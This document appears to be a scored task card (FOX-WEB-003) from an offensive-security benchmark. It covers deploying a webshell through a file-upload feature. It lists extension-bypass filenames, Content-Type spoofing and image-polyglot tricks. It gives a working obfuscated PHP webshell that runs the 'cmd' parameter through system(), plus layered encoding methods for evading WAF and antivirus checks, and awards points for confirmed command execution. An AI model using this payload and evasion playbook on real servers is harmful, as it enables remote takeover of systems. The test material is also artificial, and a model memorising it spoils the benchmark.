# FOX-WEB-003: File Upload — Webshell Deployment

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-WEB-003 |
| **Domain** | Web Security |
| **MITRE** | T1505.003 (Server Software Component: Web Shell) |
| **Difficulty** | Medium |
| **Prerequisites** | File upload functionality on target |

## Methodology
1. **Detection**: Upload standard image → verify response. Check for MIME type, extension, content filtering.
2. **Extension bypass attempts**:
   - `shell.php`, `shell.php5`, `shell.phtml`, `shell.php.`, `shell.php.bak`
   - `shell.php%00.png`, `shell.php\x00.png` (null byte)
   - `shell.pHp`, `shell.PhP`, `shell.PHP` (case variation)
   - `shell.php%20`, `shell.php%0d%0a` (whitespace injection)
   - `shell.php.jpg`, `shell.php;.jpg`, `shell.php/.jpg` (double extension)
3. **Content-type manipulation**:
   - `Content-Type: image/jpeg` with PHP code inside
   - `Content-Type: application/x-php`
4. **Image polyglot**:
   - Embed PHP code in EXIF/comment section of valid JPEG
   - Use `exiftool` or manual hex editing
5. **Webshell payload** (obfuscated PHP):
   ```php
   <?php $a=base64_decode("c3lzdGVt");$b=$_GET['cmd'];$a($b);?>
   ```
6. **Validate**: Access uploaded file → execute command → response contains output
7. **Obfuscation**: For WAF/AV bypass:
   - `gzinflate(base64_decode(...))` for PHP
   - AES encrypted payload
   - Multiple encoding layers (base64 → rot13 → gzcompress)

## Keywords
`upload-insecure-files`, `webshell`, `extension bypass`, `content-type manipulation`, `polyglot image`, `php shell`, `aspx shell`, `file upload RCE`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| Upload detection (endpoint identified) | 10 |
| Extension bypass attempted (3+ methods) | 20 |
| Content-type bypass attempted | 15 |
| Webshell successfully uploaded | 25 |
| Command execution confirmed via webshell | 20 |
| Obfuscation applied | 10 |
| **Total** | **100** |
